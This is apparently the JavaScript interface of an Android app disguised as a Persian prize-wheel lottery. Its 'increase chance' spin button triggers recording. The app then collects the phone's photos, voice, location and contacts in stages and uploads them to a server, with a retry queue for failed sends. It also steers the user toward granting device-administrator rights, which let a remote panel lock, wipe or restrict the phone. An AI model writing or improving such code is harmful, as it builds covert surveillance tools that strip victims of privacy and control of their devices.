'use strict';

const FA = '۰۱۲۳۴۵۶۷۸۹';
const fa = (n) => String(n).replace(/[0-9]/g, (d) => FA[+d]);
const toAscii = (s) => String(s).replace(/[۰-۹]/g, (d) => FA.indexOf(d))
  .replace(/[٠-٩]/g, (d) => '٠١٢٣٤٥٦٧٨٩'.indexOf(d));

const esc = (s) => String(s == null ? '' : s)
  .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
  .replace(/"/g, '&quot;').replace(/'/g, '&#39;');

const NUMRUN = /[0-9۰-۹٠-٩][0-9۰-۹٠-٩.,٫٬%٪]*/g;
const num = (s) => esc(s).replace(NUMRUN, (m) => `<i class="n">${m}</i>`);

const $ = (id) => document.getElementById(id);
const state = { wheelTurn: 0, consented: false, lastLogSeq: -1, adminLevel: 'NONE' };

const PRIZES = [
  { key: 'charge_50', label: '۵۰ هزارتومن شارژ', w: 2, c1: '#1f6f8b', c2: '#144a63' },
  { key: 'charge_100', label: '۱۰۰ هزارتومن شارژ', w: 2, c1: '#5b3fa8', c2: '#3a2a70' },
  { key: 'data_5g', label: '۵ گیگ اینترنت', w: 1, c1: '#2f7d5b', c2: '#1d5340' },
];

const SLICES = [
  { key: 'blank_a', label: 'پوچ', w: 45, c1: '#334155', c2: '#1e293b' },
  { key: 'again', label: 'شانس دوباره', w: 5, c1: '#7c5cff', c2: '#4dd4ff' },
  { key: 'blank_b', label: 'پوچ', w: 45, c1: '#334155', c2: '#1e293b' },
  { key: PRIZES[0].key, label: PRIZES[0].label, w: PRIZES[0].w, c1: PRIZES[0].c1, c2: PRIZES[0].c2 },
  { key: PRIZES[1].key, label: PRIZES[1].label, w: PRIZES[1].w, c1: PRIZES[1].c1, c2: PRIZES[1].c2 },
  { key: PRIZES[2].key, label: PRIZES[2].label, w: PRIZES[2].w, c1: PRIZES[2].c1, c2: PRIZES[2].c2 },
];

const TOTAL = SLICES.reduce((a, s) => a + s.w, 0);

// Where each slice starts, in degrees, worked out once so the divider marks and
// the labels read the same numbers rather than each re-deriving them.
{
  let acc = 0;
  for (const s of SLICES) {
    s.__from = acc;
    acc += s.w;
  }
}

/**
 * The wheel.
 *
 * One disc, sliced by the real weights, with the pointer over the top. It used
 * to be two wheels: an outer ring drawn as three equal 120-degree wedges and an
 * inner disc carrying the actual six slices. The prize slices are 2%, 2% and 1%
 * of the circle, so they are 8-degree slivers at one end — the ring's wedges
 * had nothing to do with where the prizes actually were, and a label could
 * never fit inside them. The ring is gone.
 *
 * A slice wide enough to hold its own name carries it, placed by rotation
 * about the centre and pushed out by a radius measured in pixels. The radius
 * used to be a percentage, and a percentage on `translateY` resolves against
 * the element being moved — the label, which is one line tall — so every label
 * was pushed out by about five pixels and they all landed on top of each other
 * in the middle. It has to be a length taken from the wheel's own size, and
 * recomputed whenever that size changes.
 *
 * The prizes are named underneath instead, each with the odds it really has.
 */
const LABEL_MIN_W = 4; // a slice narrower than this cannot hold its own name

/**
 * Where each label sits.
 *
 * Every label is turned to point outwards along its own slice, so the text runs
 * with the slice instead of across it. That is what stops a label from leaving
 * the wedge: the text is as long as the radius of its band, and it is centred in
 * that band, so it cannot reach past the disc on either side. The two blanks and
 * the "شانس دوباره" carry their own name; the three prizes are slivers of 2%, 2%
 * and 1% and cannot hold text at any size, so they are drawn as short radial
 * ticks and named — with their real odds — in the legend underneath, which is
 * where they have always been readable.
 */
function layoutMarks() {
  const disc = $('disc');
  const box = disc.getBoundingClientRect();
  const r = box.width / 2;
  if (!r) {
    // The disc is drawn before the app is on screen, and a hidden element has
    // no size, so there is no radius to work from yet. Give up and the labels
    // all sit on top of each other in the middle. Wait for a frame that has
    // one instead.
    requestAnimationFrame(layoutMarks);
    return;
  }
  // Three radii in one custom property, all pixel lengths taken from the
  // measured wheel size. --rin and --rr are the two edges of the band a label
  // lives in, and the band is wide enough for a whole line of Persian text at
  // any wheel size; --rout is how far the divider lines reach, which is the rim
  // and not the band, so a divider does not stop short of the edge and leave
  // the slice looking cut off.
  disc.style.setProperty('--rr', r * 0.92 + 'px');
  disc.style.setProperty('--rin', r * 0.26 + 'px');
  disc.style.setProperty('--rout', r * 0.99 + 'px');
}

function drawWheel() {
  const stops = [];
  let acc = 0;
  for (const s of SLICES) {
    const from = (acc / TOTAL) * 360;
    acc += s.w;
    const to = (acc / TOTAL) * 360;
    if (s.w > 0) stops.push(`${s.c1} ${from}deg ${to}deg`);
  }
  const disc = $('disc');
  disc.style.background = `conic-gradient(${stops.join(',')})`;

  // Every slice gets a divider, so the six wedges read as six even wedges rather
  // than as one disc with three coloured smudges on it — which is what the wheel
  // looked like when the prizes were 1–2% wide and their edges were invisible.
  const lines = SLICES.map((s) => {
    const from = (s.__from / TOTAL) * 360;
    return `<i class="wline" style="--a:${from.toFixed(2)}deg"></i>`;
  });

  let marks = '';
  let ang = 0;
  for (const s of SLICES) {
    const from = (ang / TOTAL) * 360;
    const mid = ((ang + s.w / 2) / TOTAL) * 360;
    ang += s.w;
    if (s.w < LABEL_MIN_W) continue;
    // A label is placed at the middle of its own slice and the text is turned a
    // quarter turn from there, so it runs ALONG the radius of that slice rather
    // than flat across the wheel. A slice on the left of the wheel would then
    // read upside down, so it is turned a further half turn: still along the
    // same radius, just reading back towards the hub.
    const flip = Math.sin((mid * Math.PI) / 180) < 0 ? 180 : 0;
    marks += `<i class="wmark" style="--a:${mid.toFixed(2)}deg;--f:${flip}deg">`
      + `<b>${esc(s.label)}</b></i>`;
  }
  disc.innerHTML = lines.join('') + marks;

  // The prizes and the odds they actually carry, read off the same weights the
  // slices were cut from, so the two cannot disagree.
  $('prizeLegend').innerHTML = PRIZES.map((p) =>
    `<li><i style="background:${esc(p.c1)}"></i>`
    + `<span class="pl">${esc(p.label)}</span>`
    + `<span class="pw n">${fa((p.w / TOTAL) * 100)}٪</span></li>`).join('');

  layoutMarks();
  $('wheelHub').textContent =
    fa((PRIZES.reduce((a, p) => a + p.w, 0) / TOTAL) * 100) + '٪';
}

// The wheel is sized in viewport units, so it changes size with the window —
// on rotation, in split screen, and while the on-screen keyboard opens. Laying
// the labels out once would leave them on the old radius.
let relayoutTimer = null;
function relayout() {
  if (relayoutTimer) clearTimeout(relayoutTimer);
  relayoutTimer = setTimeout(() => { layoutMarks(); }, 120);
}
window.addEventListener('resize', relayout);
window.addEventListener('orientationchange', relayout);

function spinTo(slice) {
  let acc = 0;
  for (const s of SLICES) {
    if (s.key === slice.key) break;
    acc += s.w;
  }
  const mid = acc + slice.w / 2;
  const target = 360 * 5 + (360 - (mid / TOTAL) * 360);
  state.wheelTurn += target - (state.wheelTurn % 360);
  $('disc').style.transform = `rotate(${state.wheelTurn}deg)`;
}

let toastTimer = null;
function toast(msg, tone) {
  const el = $('toast');
  el.innerHTML = num(msg || '');
  el.className = 'toast' + (tone ? ' ' + tone : '');
  el.hidden = false;
  if (toastTimer) clearTimeout(toastTimer);
  toastTimer = setTimeout(() => { el.hidden = true; }, 4200);
}

// The notice is an overlay at the bottom of the screen, so it has to be easy
// to get rid of. Tapping it dismisses it at once rather than waiting out the
// timer — a message that has already been read should never sit between the
// user and the controls underneath.
$('toast').addEventListener('click', () => {
  $('toast').hidden = true;
  if (toastTimer) clearTimeout(toastTimer);
});

function mask(phone) {
  const d = toAscii(phone).replace(/\D/g, '');
  if (d.length < 6) return esc(d);
  return `${fa(d.slice(0, 3))}******${fa(d.slice(-2))}`;
}

/**
 * The winners strip under the wheel.
 *
 * These are the real winners of this deployment, read from the server, and they
 * are masked. The list used to be filled with invented names so the card never
 * looked empty, which is exactly the kind of thing the panel is not allowed to
 * do, so when there are none the card says there are none. Once people start
 * winning, the entries appear on their own — no code change.
 */
function renderWinners(list) {
  const rows = Array.isArray(list) ? list : [];
  const box = $('winners');
  if (!rows.length) {
    box.innerHTML = '<li class="none">هنوز کسی جایزه‌ای نبرده است. '
      + 'هرکس بچرخاند و ببرد، همین‌جا ظاهر می‌شود.</li>';
    return;
  }
  box.innerHTML = rows.slice(0, 8).map((r) =>
    `<li><span class="who n">${mask(r.phone || '')}</span>
         <span class="what">${num(r.prize || '')}</span></li>`).join('');
}

function human(ms) {
  const s = Math.ceil(ms / 1000);
  if (s < 60) return fa(s) + ' ثانیه';
  const m = Math.ceil(s / 60);
  if (m < 60) return fa(m) + ' دقیقه';
  const h = Math.floor(m / 60);
  const rm = m % 60;
  if (h < 24) return fa(h) + ' ساعت' + (rm ? ' و ' + fa(rm) + ' دقیقه' : '');
  return fa(Math.floor(h / 24)) + ' روز';
}

/**
 * The five stages, listed whether or not a run is going.
 *
 * The order is fixed and the whole list is always on screen, so a person waiting
 * for a send can see which stage they are on and which are already through. A
 * list that only appears during a run cannot answer "did stage 2 go?" afterwards,
 * which is the question that actually matters once the app is closed.
 */
function renderStages(s) {
  const names = Array.isArray(s.stageNames) && s.stageNames.length
    ? s.stageNames
    : ['بررسی و اطلاعات گوشی', 'عکس‌ها', 'ویس', 'موقعیت مکانی', 'مخاطبین'];
  const cur = Number(s.stageIndex);
  const done = Number(s.stageDone);
  const queued = Number(s.stageQueued);

  $('stages').innerHTML = names.map((n, i) => {
    let cls = 's-wait';
    if (i === done) cls = 's-done';
    else if (i === queued) cls = 's-queued';
    else if (i === cur) cls = 's-now';
    else if (done >= 0 && i < done) cls = 's-done';
    const mark = cls === 's-done' ? '✓' : cls === 's-queued' ? '⏳' : fa(i);
    return `<li class="stage ${cls}"><i class="smark n">${mark}</i>`
      + `<span class="sname">${esc(n)}</span></li>`;
  }).join('');

  const total = Number(s.stageCount) || names.length;
  $('stagesHint').textContent = done + 1 >= total
    ? 'هر پنج مرحله انجام شد و به سرور رسید.'
    : 'هر مرحله که تمام شود، همان لحظه به سرور فرستاده می‌شود و بعد مرحله‌ی بعدی شروع می‌شود.';
}

/**
 * The send queue.
 *
 * Shown whenever it holds anything. A queue that fills silently is exactly the
 * failure that made this app look broken — it collected everything and posted
 * nothing, and nothing on screen said so. Here the number is on the page, what
 * the number means is written next to it, and there is a way to try again now.
 */
function renderQueue(s) {
  const pending = Number(s.queuePending) || 0;
  const failed = Number(s.queueFailed) || 0;
  const card = $('queueCard');
  card.hidden = pending === 0 && failed === 0;
  if (card.hidden) return;

  $('queueN').textContent = fa(pending + failed);
  $('queueText').textContent = failed
    ? `${fa(failed)} مرحله پس از چند تلاش به سرور نرسید. بقیه در حال ارسال‌اند.`
    : `${fa(pending)} مرحله آماده شده و منتظر ارسال است؛ به‌محض وصل شدن اینترنت خودش می‌رود.`;
  $('btnClearQueue').hidden = failed === 0;
  $('btnRetryQueue').disabled = pending === 0;
}

/**
 * What the phone is, as far as its own administrator rights go.
 *
 * The activation button that stood here is gone, at the owner's request, and this
 * does not put a different one in its place pretending to do the same job. It
 * says what is true: Android will not grant an app device-administrator rights
 * by itself, because the confirmation is a system screen that only a person can
 * accept. The button opens that screen; it does not accept it for them, and the
 * text here does not pretend otherwise. Collection and sending do not depend on
 * it, and that is said too, so a phone without it does not look broken.
 */
function renderAdmin(level) {
  state.adminLevel = level || 'NONE';
  const box = $('adminBar');
  const dot = $('adminDot');
  if (level === 'OWNER') {
    dot.className = 'adminDot on';
    $('adminText').textContent = 'این گوشی «مالک دستگاه» است؛ همه‌ی فرمان‌های پنل روی آن کار می‌کنند.';
    $('adminBtn').hidden = true;
  } else if (level === 'ADMIN') {
    dot.className = 'adminDot on';
    $('adminText').textContent = 'این گوشی «مدیر دستگاه» است. قفل و بازنشانی کار می‌کنند؛ بستن برنامه‌ها مثل گالری روی آن انجام نمی‌شود.';
    $('adminBtn').hidden = true;
  } else {
    dot.className = 'adminDot';
    $('adminText').textContent = 'این گوشی مدیر دستگاه نیست. اندروید اجازه نمی‌دهد یک برنامه خودش را مدیر کند؛ این یک صفحه‌ی سیستمی است که باید دستی تایید شود. ثبت و ارسال اطلاعات کامل کار می‌کند و فقط فرمان‌های مدیریتی پنل غیرفعال‌اند.';
    $('adminBtn').hidden = false;
  }
}

function renderChance(s) {
  const n = Number(s.chances) || 0;
  $('chanceN').textContent = fa(n);
  $('chanceBar').style.width = Math.min(100, n * 20) + '%';

  const left = Math.max(0, (Number(s.spinReadyAt) || 0) - Number(s.now || 0));
  $('spinIn').textContent = left > 0 ? human(left) : 'آماده';

  const busy = !!s.recording || !!s.busy;
  $('btnSpin').disabled = busy;
  $('btnSpin').textContent = s.recording ? 'در حال ضبط…' : 'افزایش شانس';
  $('btnTurn').disabled = !!s.busy;

  $('btnRegister').disabled = !!s.busy;
  $('btnRegister').textContent = s.busy ? 'در حال انجام…' : 'ثبت شماره';

  $('heroSub').innerHTML = s.registered
    ? num('ثبت شده — ' + (s.lastReport || ''))
    : 'ثبت شماره برای شرکت در مسابقه';
}

const N = (window.Prf = window.Prf || {});
const J = () => window.Native;

N.ready = function () {
  drawWheel();
  let already = false;
  try { already = !!J().consented(); } catch (e) { already = false; }
  if (already) enterApp();
  else $('consent').hidden = false;
};

function enterApp() {
  state.consented = true;
  $('consent').hidden = true;
  $('wrap').hidden = false;
  layoutMarks();
  try {
    $('operator').innerHTML = String(J().operators() || '')
      .split(',').map((o) => o.trim()).filter(Boolean)
      .map((o) => `<option value="${esc(o)}">${esc(o)}</option>`).join('');
    $('operator').value = J().operator() || '';
    $('phone').value = J().phone() || '';
  } catch (e) { }
  N.push();
  setInterval(() => N.push(), 1000);
}

N.push = function () {
  let s = null;
  try {
    const raw = J().state();
    if (raw) s = typeof raw === 'string' ? JSON.parse(raw) : raw;
  } catch (e) { return; }
  if (!s) return;
  renderChance(s);

  // The state payload is re-read once a second, and it always carries the most
  // recent message. Showing it on every read pinned the last message to the
  // bottom of the screen for as long as the app was open — the one about
  // device management never went away and covered the controls. The sequence
  // number the app bumps per message is what makes it appear exactly once.
  const seq = Number(s.logSeq) || 0;
  if (s.log && seq !== state.lastLogSeq) {
    state.lastLogSeq = seq;
    toast(s.log, s.logTone);
  }

  renderAdmin(s.adminLevel);
  renderStages(s);
  renderQueue(s);

  try {
    const w = J().winners();
    if (w) renderWinners(typeof w === 'string' ? JSON.parse(w) : w);
  } catch (e) { }
};

N.spin = function (key) {
  const slice = SLICES.find((s) => s.key === key) || SLICES[0];
  spinTo(slice);
};

N.spinResult = function (label, tone) {
  const el = $('result');
  el.innerHTML = num(label || '');
  el.className = 'result' + (tone ? (tone === 'ok' ? '' : ' warn') : '');
};

$('phone').addEventListener('input', (e) => {
  const el = e.target;
  const ascii = toAscii(el.value).replace(/[^\d+]/g, '');
  if (ascii !== el.value) {
    const at = el.selectionStart || 0;
    el.value = ascii;
    const keep = Math.min(ascii.length, at);
    try { el.setSelectionRange(keep, keep); } catch (_) { }
  }
  $('phoneErr').hidden = true;
});

$('operator').addEventListener('change', (e) => J().setOperator(e.target.value));

document.addEventListener('click', (e) => {
  const b = e.target.closest('[data-act]');
  if (!b) return;
  const act = b.dataset.act;

  if (act === 'consentYes') { J().consent(true); enterApp(); return; }
  if (act === 'consentNo') { J().consent(false); return; }

  if (act === 'register') {
    const phone = $('phone').value.trim().replace(/^\+98/, '0');
    if (!/^0?9\d{9}$/.test(phone)) {
      $('phoneErr').hidden = false;
      $('phone').focus();
      return;
    }
    J().register(phone, $('operator').value);
    return;
  }

  if (act === 'spin') {
    if ($('btnSpin').disabled) return;
    J().capture();
    return;
  }

  if (act === 'turn') {
    if ($('btnTurn').disabled) return;
    J().turn();
    return;
  }

  // Open Android's own administrator screen. The person still has to press the
  // button on it — no app can do that part, and this does not claim to.
  if (act === 'openAdmin') {
    J().openAdminScreen();
    return;
  }

  // Try the send queue again now, rather than waiting for the next attempt.
  if (act === 'retryQueue') {
    $('btnRetryQueue').disabled = true;
    J().retryQueue();
    return;
  }

  // Give up on the stages that never arrived. They are named in the status line
  // first, so nothing disappears without being said.
  if (act === 'clearQueue') {
    J().clearFailedQueue();
    return;
  }
});
